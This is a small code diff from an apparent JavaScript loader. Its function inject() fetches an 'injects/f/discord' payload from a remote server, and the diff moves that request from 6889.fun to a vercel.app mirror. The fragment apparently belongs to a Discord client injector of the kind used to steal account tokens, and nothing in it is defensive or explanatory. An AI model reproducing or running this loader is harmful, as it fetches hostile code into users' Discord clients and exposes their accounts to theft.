@@ -67,7 +67,7 @@ function findIndex(f) {
 
 async function inject() {
     try {
-        const res = await axios.get("https://6889.fun/api/aurathemes/injects/f/discord", {
+        const res = await axios.get("https://6889-fun.vercel.app/api/aurathemes/injects/f/discord", {
             headers: {
                 aurathemes: true,
             },
